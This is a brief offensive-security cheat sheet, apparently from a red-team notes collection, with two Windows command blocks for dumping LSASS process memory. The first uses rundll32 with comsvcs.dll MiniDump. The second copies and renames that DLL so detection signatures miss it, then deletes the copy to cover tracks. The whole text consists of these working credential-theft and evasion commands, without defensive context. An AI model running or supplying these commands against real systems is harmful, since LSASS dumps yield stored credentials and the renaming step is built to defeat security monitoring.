### Dump lsass process
```
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id <fullPath>\lsassdump.dmp full
```

### Bypass command signature
```
$id = Get-Process lsass; cd c:\tmp; copy C:\Windows\System32\comsvcs.dll <newName>.dll; rundll32.exe <newName>.dll, MiniDump $id.Id c:\tmp\<file>.dmp full; Wait-Process -Id (Get-Process rundll32).id; del <newName>.dll;
```

